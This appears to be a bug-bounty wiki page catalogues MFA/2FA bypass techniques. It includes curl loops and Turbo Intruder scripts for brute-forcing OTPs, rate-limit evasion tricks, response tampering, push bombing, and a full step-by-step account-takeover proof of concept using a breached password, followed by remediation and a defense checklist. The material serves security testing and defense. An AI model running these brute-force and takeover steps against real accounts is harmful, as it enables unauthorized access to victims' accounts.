---
type: wiki
category: attack
tool: burp,turbo-intruder,manual
status: active
last-updated: 2026-04-21
---

# MFA / 2FA Bypass Handbook (2026 Edition)

> **Purpose:** MFA bypass = P1 / Critical (usually). Real-world 2FA implementations have 15+ common weak points. Missing rate limits, races, response tampering, and backup-code enumeration are the most frequent hits.

## 0. Threat Model

Precondition: the attacker already has the victim's password (credential stuffing / phishing / breach), and MFA is the last remaining barrier.

## 1. Missing Rate Limits

### 1.1 OTP brute force

```
# A 6-digit OTP = 1,000,000 combinations
# With no rate limit and a 30-second TTL → may still be feasible in time
```

```bash
# Burp Intruder / Turbo Intruder / ffuf
for i in {000000..999999}; do
  curl -s -X POST https://target.com/api/verify-otp \
    -H "Authorization: Bearer $SESSION" \
    -d "otp=$i" | grep -q success && echo "$i" && break
done
```

### 1.2 Turbo Intruder race + multiple IPs

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100,
    )
    for i in range(1000000):
        engine.queue(target.req, str(i).zfill(6))
```

### 1.3 Per-session rate limit bypass

```
# If the rate limit is tied to the session token → swapping tokens resets the counter
# But most implementations still reject once the token is verified → not useful

# If the rate limit is tied only to IP → change IP
# X-Forwarded-For: 1.2.3.4
```

## 2. Rate Limit Present but Bypassable (HTTP smuggling / parameters)

### 2.1 HTTP parameter pollution

```
otp=000000&otp=000001&otp=000002
# If the backend only validates the last value, the counter increments only once → try multiple values per request
```

### 2.2 Endpoint differences

```
POST /api/verify-otp      → has a rate limit
POST /api/v1/verify-otp   → doesn't (old version)
POST /verify-otp/          → missed
POST /verify-otp%20        → trailing space
POST /verify-otp?_=1       → bypassed via query string
```

### 2.3 Cookie / header switching

```
# Some rate limits are tied to a specific header
# Try removing X-Request-ID / User-Agent
```

## 3. Response Manipulation

### 3.1 Status code tampering

```bash
# Submit any OTP → server replies "failed"
# Modify the response in Burp
HTTP/1.1 401 → 200 {"success":true}
```

If the frontend only checks `response.ok`, this can be bypassed.

### 3.2 JSON boolean flip

```json
// Server response
{"verified":false}

// Modified in Burp to
{"verified":true}
```

### 3.3 GraphQL response edit

```graphql
mutation { verifyOtp(code:"000000") { success } }
# Edit the response to success=true
```

## 4. 2FA Disable / Reset

### 4.1 DELETE /2fa/settings

```bash
# If the disable-2FA endpoint doesn't require MFA re-authentication
curl -X DELETE https://target.com/api/2fa \
  -H "Authorization: Bearer $PARTIAL_TOKEN"
# If this succeeds → 2FA is disabled directly
```

### 4.2 Change phone / email without 2FA

```bash
# PATCH /api/user changes the phone number → next SMS goes to the attacker
curl -X PATCH https://target.com/api/user \
  -H "Authorization: Bearer $PARTIAL_TOKEN" \
  -d '{"phone":"+1234567890"}'
```

### 4.3 "Forgot 2FA" flow

```
"Lost 2FA device" → falls back to email verification
If only email is verified (and the attacker already has the victim's password and possibly email access) → bypass
```

## 5. Session / Token Issues

### 5.1 Pre-MFA token has excessive privileges

```
# Step 1 of login returns a pre_auth_token
# In theory it should only be usable to call /verify-otp
# But in practice /api/users/me and /api/profile can also be called (not scoped)
→ effectively treated as already authenticated
```

### 5.2 Token reuse

```
# After MFA passes → a final token is issued
# If the pre_auth_token can be reused to log in again → and it also returns a final token (bad implementation)
```

### 5.3 Cookie leaks auth state

```
Cookie: authState=MFA_REQUIRED
Attacker changes it to authState=AUTHENTICATED
```

## 6. Backup Code Attacks

### 6.1 Backup code brute force

```
# 10 backup codes, each 8 alphanumeric characters
# Without a rate limit you can't brute-force all of them, but consider:
# - a rate limit exists but only applies to OTP, not to backup codes
# - backup codes use a weaker format (4 digits) → 10,000 combinations is brute-forceable
```

### 6.2 Predictable backup code generation

```
# If generated via Math.random() / a time-based seed → predictable
# See [81-03-random-prng-issues.md] or the OWASP crypto guidance
```

### 6.3 Reset leaks old backup codes

```
# After resetting backup codes, does the API display the old codes?
# Some apps display them (hashed) but compare using plaintext → can be derived
```

## 7. Push-Based MFA Attacks

### 7.1 Push bombing (MFA fatigue)

```
# The attacker triggers login attempts 100 times in a row → the victim's phone gets 100 push notifications
# Eventually the victim taps "Allow" (or mis-taps) → the barrier is broken
```

This is how the 2022 Uber breach happened.

### 7.2 Number matching bypass

In 2026, Google / Microsoft push notifications require the user to manually enter a 2-digit challenge, which lowers the fatigue-attack success rate — but some IT staff still approve out of habit.

### 7.3 Concurrent sessions

```
# Open two tabs at once: the first triggers the push, the second races in right after the victim authorizes
```

## 8. SMS Interception (Side-Channel)

### 8.1 SIM swap

Social-engineering the telco → transfer the SIM → intercept SMS. This isn't strictly a web vulnerability, but a program may still require that SMS not be the sole MFA factor.

### 8.2 SS7 attack (usually out of scope)

### 8.3 Mobile malware forwarding SMS

## 9. TOTP-Specific Attacks

### 9.1 Time-window reuse

```
# TOTP codes are valid for 30 seconds
# If the server doesn't track already-used codes → an attacker who captures the victim's code can also use it within that 30-second window
```

### 9.2 Secret leak

```
# The QR code used during TOTP enrollment leaks the secret (URL parameter, log, /etc/*.env)
# → the attacker can compute TOTP codes themselves
```

### 9.3 Time skew

```
# If the server accepts a ±30 second window → 2 x 6 digits = 2,000,000 combinations (but still depends on rate limiting)
```

## 10. WebAuthn Attacks

Uncommon but appearing in 2026:

### 10.1 Cross-origin challenge reuse

If the challenge isn't scoped to the RP ID → it can be relayed.

### 10.2 User verification flag downgrade

If the challenge doesn't require `userVerification: required` → an attacker's malicious authenticator can skip the PIN.

### 10.3 Credential enumeration

The registration flow leaks whether a username is already registered.

## 11. Remember-Device / Trust Cookies

### 11.1 Predictable device_id

```
# Cookie: device_id=MD5(username + "_trusted")
# Predictable → an attacker can set this cookie themselves
```

### 11.2 Device cookie not bound to a session

```
# The attacker grabs the trust cookie from their own session
# Transfers it to the victim's session → the victim's next login skips MFA
```

### 11.3 Trust cookie never expires

Permanent trust means a single XSS is enough to permanently bypass MFA.

## 12. OAuth / SSO Bypassing MFA

### 12.1 SSO endpoint skips MFA

```
# Direct login enforces MFA
# But /auth/saml/callback accepts a SAML assertion → doesn't check MFA state
```

### 12.2 Legacy endpoint

```
/api/v1/login         → new, has MFA
/api/mobile/login     → old, no MFA
```

## 13. Full PoC: OTP with No Rate Limit → ATO

### Step 1: Login step 1

```bash
curl -X POST https://target.com/api/login \
  -d '{"email":"victim@example.com","password":"pwned_from_breach"}' \
  -c cookies.txt

# Response
{"status":"mfa_required","session":"PRE_AUTH_TOKEN_XXX"}
```

### Step 2: Test the rate limit

```bash
for i in 000000 000001 000002 000003 000004; do
  curl -s -X POST https://target.com/api/verify-otp \
    -H "Cookie: session=PRE_AUTH_TOKEN_XXX" \
    -d "{\"otp\":\"$i\"}"
  echo
done
# All 5 attempts return {"error":"invalid"} with no sign of a rate limit
```

### Step 3: Turbo Intruder brute force

```python
# 1,000,000 combinations @ 50 concurrent connections → finishes in about 5 minutes
# The success response includes an extra "token" field
```

### Step 4: Obtain the final token

```
{"success":true,"token":"FINAL_AUTH_TOKEN"}
```

### Step 5: Verify account takeover

```bash
curl https://target.com/api/users/me \
  -H "Authorization: Bearer FINAL_AUTH_TOKEN"
# → returns the victim's data
```

### Step 6: Report

```markdown
## Vulnerability Summary
POST https://target.com/api/verify-otp does not enforce a rate limit on the
pre-auth session, allowing an attacker to brute-force the 6-digit OTP
(1,000,000 combinations) during the MFA verification step. Within the OTP's
validity window (roughly 60 seconds, depending on the backend implementation),
this completes a 2FA bypass and achieves full account takeover (given only
the password).

## PoC
[Login step 1 to obtain PRE_AUTH_TOKEN + Turbo Intruder script + success response]

## Impact
- Full account takeover with only the user's password (MFA provides no protection)
- Combined with a credential-stuffing list → large-scale ATO

## Severity
P1 / Critical (MFA bypass)

## Remediation
1. Limit each session to 5-10 OTP attempts; beyond that, lock the session and require re-login
2. Enforce a global limit on verification attempts (IP + account)
3. Invalidate the OTP TTL immediately after 3 failed attempts
4. Add delay (exponential backoff)
5. After X failures, force an email notification + require additional verification
```

## 14. Defense Checklist

```
1. Per-account and per-IP rate limiting (5 attempts / 10 minutes)
2. OTP TTL ≤ 60 seconds + single-use (invalidated after verification)
3. Failed-attempt counter, lock after 3-5 failures
4. Backup codes at least 8 alphanumeric characters, single-use
5. Disabling 2FA / changing phone / changing email should all require re-authentication (2FA again)
6. Strictly scope pre-MFA tokens (only usable for verify-otp, cannot fetch data)
7. Bind trust-device cookies to the session, with periodic re-verification
8. Add number matching to push MFA (2-digit challenge)
9. Unify the auth flow across mobile and web; don't leave a legacy endpoint open
10. Log all MFA failures → alert on anomalies
```

## Related Documents

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — OAuth SSO bypassing MFA
- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) — GraphQL batching to bypass rate limits
- [68-websocket-cswsh.md](68-websocket-cswsh.md) — WS auth race
- PortSwigger 2FA: https://portswigger.net/web-security/authentication/multi-factor
- OWASP MFA Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
